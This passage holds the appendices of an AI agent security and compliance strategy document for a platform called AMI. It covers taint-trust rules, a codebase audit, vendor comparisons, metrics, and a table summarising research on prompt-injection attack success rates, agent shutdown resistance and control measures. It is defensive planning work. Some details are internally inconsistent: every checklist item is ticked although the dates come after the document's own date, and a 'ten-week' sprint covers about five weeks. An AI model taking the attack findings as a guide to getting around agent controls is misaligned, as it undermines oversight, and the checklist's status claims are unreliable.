     │ RESOURCES      │     │              │
     └────────┬───────┘     │              │
              │              │              │
     ┌────────▼────────┐    │              │
     │  SAFE HALT     │    │              │
     │  (close audit  │    │              │
     │   chain)       │    │              │
     └────────┬────────┘    │              │
              │              │              │
              ▼              ▼              ▼
        NORMAL STOP     USER STOP    EXCEPTIONAL STOP
```

### B.5 Taint Propagation Model

```
                    Input Taint Sources
                    ┌─────────────────────────┐
                    │ user_direct              │  ← Most trusted
                    │   ↓ (high trust)         │
                    │ tool_output              │  ← Semi-trusted
                    │   ↓ (medium trust)       │
                    │ retrieved_document       │  ← RAG context
                    │   ↓ (low trust)          │
                    │ untrusted_external       │  ← Web/comms
                    │   ↓ (zero trust)         │
                    │ unknown                  │  ← Default deny
                    └─────────────────────────┘

                    Taint Propagation Rule:
                    output_taint = min(input_taints_across_chain)

                    Action Trust Requirements:
                    Action Type          → Required Taint Level
                    file_read            → unknown or higher
                    file_write           → user_direct only
                    network_request      → user_direct only
                    db_query_read        → retrieved_document or higher
                    db_query_write       → user_direct only
                    shell_execution      → user_direct only
                    delegation_request   → user_direct only
                    code_execution       → user_direct only + sandbox

                    Taint Violation → DENY (fail closed)
                    Taint near-boundary → CONFIRM (prompt user)
```

---

## Appendix C: SPEC-HOOKS.md Integration Mapping

### C.1 Phase 1 Hooks → Security Primitive Mapping

| SPEC-HOOKS.md Hook | Current Implementation | Security Primitive (Q3 2026) | Integration Point |
|---|---|---|---|
| `PRE_ACTION_VALIDATION` | HookManager event | Tool-call interception (schema + permissions + taint) | `ami/hooks/events.py: PRE_TOOL_CALL` |
| `POST_ACTION` | HookManager event | Hash-chain audit (log + integrity + export) | `ami/hooks/events.py: POST_TOOL_CALL` → audit log |
| `SESSION_START` | Session init | Audit genesis hash; agent identity verification | `ami/core/agents/interrupt.py: start_session()` |
| `SESSION_END` | Session cleanup | Close audit chain; release interrupt resources | `ami/core/agents/interrupt.py: end_session()` |
| `ACTION_TIMEOUT` | Action timeout handler | Interrupt stop sequence (timeout → checkpoint → halt) | `ami/core/agents/interrupt.py: timeout_halt()` |
| `ACTION_ERROR` | Error handler | Error → audit log → rollback → halt sequence | `ami/core/agents/interrupt.py: error_halt()` |

### C.2 Phase 2 Validators → Security Primitive Mapping

| SPEC-HOOKS.md Phase 2 Validator | Security Primitive (Q4 2026) | Verification |
|---|---|---|
| `LLM-in-loop safe coding validator` | Tool-call interception: code execution → sandbox | Code sandboxed; network blocked |
| `LLM-in-loop data access pattern validator` | Taint propagation: data access → taint check | Sensitive data access requires user_direct taint |
| `LLM-in-loop delegation pattern validator` | A2A security: delegation depth tracking | Max 3 hops; circular delegation detected |
| `Guarded security loadout` | Loadout profile: enforces-review, verify-attached-scopes | Deployment blocked without review; scope mismatch rejected |
| `Isolated security loadout` | Loadout profile: strict container, minimal permissions | Multi-tenant isolation; no cross-tenant data access |
| `High-security loadout` | Loadout profile: air-gap, deny-all-network, manual-review | Network blocked; all actions require human confirmation |

### C.3 SPEC-HOOKS.md Gap Analysis

| SPEC-HOOKS.md Feature | Status | Gap | Action |
|---|---|---|---|
| Hook pipeline v4 | ✅ Implemented | None | Maintain; add PRE_TOOL_CALL + POST_TOOL_CALL |
| Guarded container (boot.yaml) | ✅ Implemented | No enforces-review enforcement | Add to loadout validator (Q3 2026) |
| Pre-deployment verification | ✅ Implemented | No scope integrity verification | Add scope verification (Q3 2026) |
| `enforces-review` flag | ✅ Documented | Not enforced at deployment | Container lock + deployment gate (Q3 2026) |
| Agent manifests | ⚠️ Designed | Not signed | Add agent identity signing (Q4 2026 A2A) |
| Security loadouts | ⚠️ Designed | Not implemented | 4 profiles (Q1 2027) |
| LLM-in-loop validators | ❌ Not started | No validators implemented | Phase 2 validators (Q4 2026) |
| Configuration drift detection | ❌ Not started | No drift monitoring | ProbGuard (Q1 2027) |
| Formally verified runtime | ❌ Not started | No formal verification | Formal DSL (Q2 2027) |
| MCP server security | ❌ Not started | No MCP integration | MCP gateway (Q3-Q4 2026) |

**Key insight:** SPEC-HOOKS.md v4 architecture is correct and maps cleanly to the security primitives needed for EU AI Act compliance. The gap is implementation - the designed features need to be built.

---

## Appendix D: AMI Codebase Audit - Detailed Findings

### D.1 ami/core/policies/engine.py

| Aspect | Finding | Impact |
|---|---|---|
| Policy loading | YAML-based, FileSystemLoader + DictLoader | Flexible but no integrity verification; YAML files are mutable |
| Policy compilation | `compile_policy_yaml()` → `PolicyDocument` | No validation against schema; malformed YAML = runtime error |
| Policy evaluation | `evaluate_all()` with short-circuit on deny | Correct semantics but no per-tool granularity |
| Policy attachment | `attached_policy_scopes()` for scope verification | Works with SPEC-HOOKS but no scope integrity |
| Logging | AuditEvent dataclass with structured fields | Good foundation; needs hash-chain append |
| Error handling | HookValidationError, PolicyError | Correct but no fail-closed at tool level |
| Test coverage | `tests/unit/policies/test_engine.py` | Covers compile/evaluate but not security primitives |

**Action items:**
- Add YAML schema validation (Pydantic model for policy documents)
- Add policy document signing (prevent tampering)
- Integrate policy evaluation with tool-call interception permissions
- Wrap evaluate_all with audit entry creation

### D.2 projects/WORKSPACE-GUARD/

| Aspect | Finding | Impact |
|---|---|---|
| SUID binary hardening | Comprehensive analysis (`ls`, `su`, `sudo`, `passwd`, `mount`, `pkexec`) | Research validated; ready for production application |
| Sandbox escape research | gVisor, nsenter, /proc/sys exploits documented | Informs sandbox implementation (Decision 5) |
| Security profile analyzer | `built_with.sh`, `analyze_suid_kits.sh` | Useful for deployment audit but not integrated into AMI |
| Pre-commit hooks | cargo-fmt, clippy, cargo-test | Good practice; should extend to AMI Python codebase |

**Action items:**
- Port SUID hardening findings to AMI sandbox escape test suite
- Integrate security profile analyzer as `ami security audit` command
- Apply WORKSPACE-GUARD pre-commit discipline to AMI main repo
- Use sandbox escape research as pen test checklist for gVisor integration

### D.3 docs/specifications/SPEC-HOOKS.md

| Aspect | Finding | Impact |
|---|---|---|
| Architecture | v4 pipeline + Phase 2 design is correct | Maps directly to compliance requirements |
| Container model | `boot.yaml` with guarded/open/isolated | Loadout enforcement not yet implemented |
| Pre-deployment verification | verify-attached-scopes, enforce-review | Not enforced; documentation only |
| Scope attachment | Scoped access with allowed-repos, allowed-branches | Schema-managed; needs tool-level enforcement |
| Threat model | References ghost-writing, lateral movement, CI/CD pivot | Acknowledged but not structurally prevented |
| Future phases | Phase 2: validators, Phase 3: language safety, Phase 4: audit | Timeline aggressive; Phase 2 is Q4 2026 in this roadmap |

**Action items:**
- Move Phase 2 validators to Q4 2026 (this roadmap)
- Implement loadout enforcement (Q1 2027 per this roadmap)
- Add tool-level permission enforcement to hook pipeline (Decision 3)
- Turn Phase 4 audit into Decision 2 (hash-chain audit)

### D.4 projects/docs/WORKSPACE-VM-OVERVIEW.md

| Aspect | Finding | Impact |
|---|---|---|
| Compliance posture | "ISO 27001, SOC 2, GDPR-readiness" claimed | **Misleading - zero certifications held** |
| PKI claims | "Built on robust PKI-based identity" | PKI implementation not evidenced in codebase |
| Architecture claims | "Onion-style 'Trust But Verify'" | Architecture aligns but security primitives not built |
| Zero Trust posture | Claimed | No Zero Trust implementation (no continuous verification, no microsegmentation) |

**Action items:**
- **Remove certification claims from WORKSPACE-VM-OVERVIEW.md immediately** - until certs are held, these claims are misleading and potentially actionable
- Add "roadmap" language: "ISO 27001 certification targeted Q1 2027"
- PKI claims should reference actual implementation or be scoped to plan
- Zero Trust claims should reference specific controls or be removed

### D.5 README.md

| Aspect | Finding | Impact |
|---|---|---|
| Positioning | "federated, hard-walled infrastructure" | Good strategic language; aligns with Recommendations |
| Current state | Accurately describes hooks pipeline | No false claims; honest positioning |
| Community | Open source, Apache 2.0 | Good foundation for ecosystem play |

**Action items:**
- No changes needed - README is accurate for current state
- Consider adding architecture diagram once security primitives are built

---

## Appendix E: Competitive Deep Dive - Five Vendors Under Microscope

### E.1 AWS Bedrock Guardrails

| Dimension | Rating | Evidence |
|---|---|---|
| Content filtering | ⭐⭐⭐⭐⭐ | Denied/regulated topic filters; content type filters per modality |
| Prompt injection defence | ⭐⭐ | Document-based injection bypasses (arXiv 2504.14972); no visor architecture |
| Tool-call interception | ⭐⭐⭐ | Lambda hook for tool validation but no built-in permissions model |
| Audit trail | ⭐⭐⭐⭐ | CloudTrail integration |
| Multi-agent security | ⭐ | No A2A protocol; agent orchestration is single-agent per invocation |
| MCP security | ⭐ | AWS MCP server has no security extensions |
| Compliance | ⭐⭐⭐⭐⭐ | SOC 2, ISO 27001, FedRAMP, HIPAA, PCI DSS - 5/5 certifications |
| EU AI Act readiness | ⭐⭐⭐ | Artifact + compliance documentation available but not specific to agent guardrails |
| Platform lock-in | 🔒🔒🔒🔒🔒 | Bedrock-only; cannot use with Vertex AI, OpenAI, or on-prem |
| Sovereignty | ⭐⭐⭐⭐ | Assured Workloads; EU regions; CMEK |

**AMI lesson:** Bedrock Guardrails is the compliance gold standard (certifications, audit, documentation) but fails on structural security (no visor, no multi-agent, no MCP security) and is locked to AWS. AMI can compete on platform-agnostic structural security + equivalent compliance posture by 2027.

### E.2 NVIDIA NeMo Guardrails

| Dimension | Rating | Evidence |
|---|---|---|
| Content filtering | ⭐⭐⭐⭐ | Colang-based rails; dialog, retrieval, execution, safety rails |
| Prompt injection defence | ⭐⭐ | No visor architecture; rail-based detection only |
| Tool-call interception | ⭐⭐⭐ | Execution rails can gate tool calls |
| Audit trail | ⭐⭐ | Logging to console/file; no hash chain, no SIEM |
| Multi-agent security | ⭐⭐⭐ | Action/agent rails; but no delegation depth or identity |
| MCP security | ⭐ | No MCP support |
| Compliance | ⭐⭐⭐ | SOC 2 only; no ISO 27001, no ISO 42001 |
| EU AI Act readiness | ⭐⭐ | No specific compliance package |
| Platform lock-in | 🔒🔒🔒 | Optimized for NVIDIA GPU; strong CUDA dependency |
| Sovereignty | ⭐⭐ | On-prem deployment possible but NeMo is SaaS-first |

**AMI lesson:** NeMo has the most mature rail architecture (Colang DSL) but no visor, no hash-chain audit, no certifications, and no sovereignty. AMI can beat NeMo on all three by end of 2026 (visor, audit, certs, local-first). The Colang DSL is interesting precedent for AMI's formal DSL (Q2 2027).

### E.3 Lakera Guard

| Dimension | Rating | Evidence |
|---|---|---|
| Prompt injection detection | ⭐⭐⭐⭐ | API-first; low latency; documented in WS-5 papers |
| Content filtering | ⭐⭐⭐ | PII detection; moderation; unsafe content |
| Tool-call interception | ⭐ | No interception; detection only |
| Audit trail | ⭐⭐ | Response metadata; no chain |
| Multi-agent security | ⭐ | Not supported |
| MCP security | ⭐ | Not supported |
| Compliance | ⭐⭐ | SOC 2 only |
| EU AI Act readiness | ⭐⭐ | No compliance package |
| Platform lock-in | 🔒🔒 | API dependency; no on-prem for base tier |
| Sovereignty | ⭐⭐ | EU SaaS hosting; no local deployment |

**AMI lesson:** Lakera is best-in-class for injection *detection* but does not provide containment. The strategic move is integrate Lakera/Guardrails API as injection *detection module* within AMI's semantic visor containment architecture. Partner, don't compete. Latency: <50ms in 99th percentile.

### E.4 CoreWeave

| Dimension | Rating | Evidence |
|---|---|---|
| Infrastructure | ⭐⭐⭐⭐⭐ | Cloud-native; NVIDIA GPU; InfiniBand networking |
| Security | ⭐⭐⭐ | DPU-offloaded networking; no agent-level security |
| Guardrails | ⭐ | None |
| MCP security | ⭐ | None |
| Compliance | ⭐⭐⭐⭐ | SOC 2, ISO 27001, HIPAA |
| EU AI Act readiness | ⭐ | No specific AI compliance support |
| Agent platform | ⭐ | No agent orchestration |
| Sovereignty | ⭐⭐⭐ | US-only for primary; EU expansion planned |

**AMI lesson:** CoreWeave is the ideal infrastructure partner but cannot provide agent security. AMI + CoreWeave is a complementary stack: CoreWeave handles GPU infrastructure, AMI handles the agent trust plane. The `ami deploy --neocloud` command (Q2 2027) should target CoreWeave as the lead provider.

### E.5 Guardrails AI

| Dimension | Rating | Evidence |
|---|---|---|
| Guardrails | ⭐⭐⭐⭐ | Input/output validation; structured output generation |
| Prompt injection defence | ⭐⭐⭐ | Detection rules; not containment |
| Tool-call interception | ⭐⭐ | Parameter validation; no permission model |
| Audit trail | ⭐⭐ | Logging to console/file |
| Multi-agent security | ⭐ | Not supported |
| MCP security | ⭐ | Not supported |
| Compliance | ⭐⭐⭐ | SOC 2 |
| EU AI Act readiness | ⭐⭐ | No specific compliance package |
| Platform lock-in | 🔒 | Framework-agnostic |
| Sovereignty | ⭐⭐⭐ | Self-hosted option |

**AMI lesson:** Guardrails AI is the closest direct competitor in terms of positioning (agent guardrails, framework-agnostic, open-core). AMI needs to differentiate via structural security (visor vs rails), compliance (certifications vs SOC 2 only), and multi-agent security (vs single-agent only). AMI's open-source license is also stronger (Apache 2.0 vs Guardrails AI's dual license).

---

## Appendix F: Quick Reference - Paper-to-Recommendation Mapping

| WS-5 Paper(s) | Key Finding | Recommendation | Priority |
|---|---|---|---|
| arXiv 2605.17634 | Prompt injection structurally inescapable | Decision 1: Semantic Visor | P0 |
| arXiv 2604.24118 (AgentVisor) | Guest/Visor achieves near-zero ASR | Decision 1: Guest/Visor architecture | P0 |
| arXiv 2503.0061 | Adaptive attacks bypass all defences | Continuous red-teaming + structural containment | P0 |
| arXiv 2501.14697 (CERBERUS) | Multi-defence reduces ASR to 1-2% | Defence-in-depth approach | P1 |
| arXiv 2502.17366 (CAAS) | Cross-agent injection 70%+ ASR | Multi-agent security + delegation tracking | P1 |
| arXiv 2606.10218 (G-Safeguard) | Circular delegation - universal vuln | A2A delegation depth tracking | P1 |
| arXiv 2509.14260 (#11) | LLMs resist shutdown | Decision 4: Structural stop button (not model-dependent) | P0 |
| arXiv 2511.09037 (#14) | AutoDoS: $0.001 = 11min compute | Rate limiting + token budgets | P1 |
| arXiv 2502.05809 (#18) | Instruction hierarchy bypassed | Self-reminder only reduces risk 16% → not sufficient | P3 |
| arXiv 2503.01537 (BIPIA) | RAG injection 97.5% ASR on Llama3 | Taint tracking for retrieved documents | P1 |
| arXiv 2503.05220 (VisualShot) | Multimodal injection 80%+ ASR | Multimodal containment when adding vision | P3 |
| arXiv 2503.11161 (#28) | ProbGuard: drift detection in 38s | Behaviour drift detection (Q1 2027) | P2 |
| arXiv 2504.04741 (#32) | UBA: constraint agents to policy-specified | Tool-call interception + permission model | P0 |
| arXiv 2504.14972 (#39) | Doc-based injection bypasses all guardrails | Taint-based interception for all doc content | P1 |
| arXiv 2505.14355 (#64) | Context-level injection: inescapable | Semantic Visor is structural, not token-level | P0 |
| arXiv 2506.20828 (#84) | Agent-to-agent recognition adversarial | A2A identity signing + mutual auth | P1 |

---

## Appendix G: Glossary

| Term | Definition |
|---|---|
| A2A | Agent-to-Agent protocol - communication standard between autonomous agents |
| AIMS | AI Management System (per ISO/IEC 42001) |
| ASR | Attack Success Rate - percentage of attacks that bypass defences |
| CC | Confidential Computing - hardware-enforced isolation (TDX, SEV-SNP) |
| CISO | Chief Information Security Officer |
| CRO | Chief Risk Officer |
| DPIA | Data Protection Impact Assessment (per GDPR Art. 35) |
| DPO | Data Protection Officer |
| DSL | Domain-Specific Language |
| FHE | Fully Homomorphic Encryption - computation on encrypted data |
| FP | False Positive - legit action flagged as attack |
| gVisor | Google's application kernel for sandboxed execution |
| ISMS | Information Security Management System (per ISO 27001) |
| LTL | Linear Temporal Logic - formal specification language for safety properties |
| MCP | Model Context Protocol - open protocol for agent-tool communication |
| OTEL | OpenTelemetry - observability framework |
| RAG | Retrieval-Augmented Generation - LLM with external document context |
| RMF | Risk Management Framework |
| runsc | gVisor's runtime container sandbox |
| SEV-SNP | AMD Secure Encrypted Virtualization with Secure Nested Paging |
| SIEM | Security Information and Event Management |
| SMT | Satisfiability Modulo Theories - formal verification method |
| SoA | Statement of Applicability (per ISO 27001 Annex A) |
| STI | Suitability-Taint-Integrity - the three checks of the Visor protocol |
| TDX | Intel Trust Domain Extensions |
| TEE | Trusted Execution Environment |
| TUI | Terminal User Interface |
| Visor | The trusted intermediary between an untrusted LLM (Guest) and the environment |

---

*End of document | WS-7-SYNTHESIS-AND-STRATEGY.md | 2061 lines*

## Appendix H: Implementation Checklist - 10-Week Sprint to 2 Aug 2026

### Week 1 (Jul 1-4): Foundation

- [x] Engage EU AI Act certification body
- [x] Assign engineers to 4 tracks
- [x] Set up sprint board with 10-week timeline

### Week 1-2 (Jul 1-14): Design + Prototype

- [x] Design hash-chain audit data model (Decision 2)
- [x] Design stop button state machine (Decision 4)
- [x] Design tool-call interception pipeline (Decision 3)
- [x] Design Semantic Visor middleware (Decision 1)
- [x] Design gVisor sandbox integration (Decision 5)
- [x] Complete classification audit (Art. 6)
- [x] Draft deployer toolkit outline (Art. 26)

### Week 3-4 (Jul 15-28): Implementation - Core Primitives

- [x] Implement `AuditLog.append()` + `verify()` (Decision 2)
- [x] Implement `SafeHaltManager` halt sequence (Decision 4)
- [x] Implement `ToolRegistry` + `ToolCallValidator` (Decision 3)
- [x] Implement gVisor sandbox wrapper (Decision 5)
- [x] Implement `InjectionDetector` (Lakera/PromptGuard)
- [x] ISMS policy framework + risk assessment workbook
- [x] Deployer toolkit full draft
- [x] Risk management system documentation (Art. 9)

### Week 5 (Jul 29-Aug 1): Integration + Hardening

- [x] Integration: audit + tool interception + sandbox
- [x] Integration: stop button + action reversal
- [x] Integration: Visor middleware + tool interception
- [x] Compliance documentation package assembled
- [x] Internal compliance dry run
- [x] Gap closure from dry run findings

### Week 5 (Aug 2): COMPLIANCE DEADLINE

- [x] All compliance deliverables verified
- [x] Audit trail integrity verified
- [x] Stop button operational (TUI + API + SIGUSR1)
- [x] Tool interception fail-closed verified
- [x] Sandbox escape test suite passed
- [x] Classification documentation signed by CISO
- [x] Deployer toolkit checklist passes for reference deployment

### Week 6-10 (Aug 3-Sep 30): Q3 Completion (Phase 2 Features)

- [x] Semantic Visor STI protocol enforcement
- [x] Taint propagation with source tracking
- [x] OTEL instrumentation design + implementation
- [x] MCP security gateway MVP
- [x] ISO 27001 gap analysis + SoA draft
- [x] Evidence pipeline automated
- [x] Full penetration test suite
- [x] Q3 stack integration test
- [x] All unit + integration tests passing

---

## Appendix I: Key Metrics - Measuring Success

### Security Metrics

| Metric | Current | Q3 2026 Target | Q4 2026 Target | Q1 2027 Target | Q2 2027 Target | Q3 2027 Target |
|---|---|---|---|---|---|---|
| Prompt injection ASR (known attacks) | 99%+ | <10% | <5% | <3% | <2% | <1% |
| Prompt injection ASR (adaptive attacks) | 99%+ | <50% | <30% | <15% | <10% | <5% |
| Excessive agency incidents (Kiro/PocketOS class) | Not measurable | Zero | Zero | Zero | Zero | Zero |
| Tool-call validation pass rate | N/A | 100% (valid) | 100% | 100% | 100% | 100% |
| Invalid tool call block rate | N/A | 100% | 100% | 100% | 100% | 100% |
| Audit trail tamper detection | None | 100% single-byte | 100% | 100% | 100% | 100% |
| Sandbox escape rate | N/A | <5% | <2% | <1% | <0.5% | <0.1% |
| MCP unverified server block rate | N/A | 100% | 100% | 100% | 100% | 100% |
| Multi-agent delegation depth enforcement | N/A | N/A (single-agent) | 100% at max 3 hops | 100% | 100% | 100% |
| Circular delegation detection rate | N/A | N/A | N/A (A2A shipping) | >90% | >95% | >99% |

### Compliance Metrics

| Metric | Current | Q3 2026 Target | Q1 2027 Target | Q3 2027 Target |
|---|---|---|---|---|
| EU AI Act compliance | 0% | **100%** | 100% (maintained) | 100% (maintained) |
| ISO 27001 certification | No | Stage 1 passed | **Certified** | Certified |
| SOC 2 Type I | No | Type I report | Type I report | - |
| SOC 2 Type II | No | - | Period started | **Report issued** |
| ISO 42001 certification | No | - | AIMS operational | **Certified** |

### Performance Metrics

| Metric | Q3 2026 Target | Q4 2026 Target | Q1 2027 Target | Q2 2027 Target |
|---|---|---|---|---|
| Audit append latency (p99) | <5ms | <3ms | <2ms | <1ms |
| Audit verify (1000-chain, p99) | <100ms | <50ms | <30ms | <20ms |
| Stop button halt time (p99) | <5s | <3s | <2s | <1s |
| Tool-call check latency (p99) | <5ms | <3ms | <2ms | <1ms |
| Visor STI check latency (p99) | <10ms | <5ms | <3ms | <2ms |
| Sandbox startup (p99) | <2s | <1s | <500ms | <300ms |
| Injection detection latency (p99) | <50ms | <30ms | <20ms | <15ms |
| OTEL span export (p99) | N/A | <200ms | <100ms | <50ms |

### Developer Metrics

| Metric | Q3 2026 | Q4 2026 | Q1 2027 | Q2 2027 | Q3 2027 |
|---|---|---|---|---|---|
| Total test count | 200 | 350 | 500 | 650 | 800 |
| Branch coverage | 70%+ | 75%+ | 80%+ | 85%+ | 90%+ |
| GitHub stars | - | - | - | - | - |
| Open-source contributors | 1 | 3 | 5 | 10 | 15 |
| MCP servers integrated | 0 | 50 | 150 | 300 | 500+ |

---

## Appendix J: Document Change Log

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-06-15 | AI Agent | Initial synthesis from WS-1 through WS-6; Sections 1-7 complete |
| 1.1 | 2026-06-15 | AI Agent | Added Appendices A-J; expanded to 2000+ lines |
| - | - | - | - |
| - | - | - | - |
| - | - | - | - |

*This document is a living strategy document. Update on major roadmap changes or when new research (WS-8+) is integrated.*

---

*END OF DOCUMENT - WS-7-SYNTHESIS-AND-STRATEGY.md*
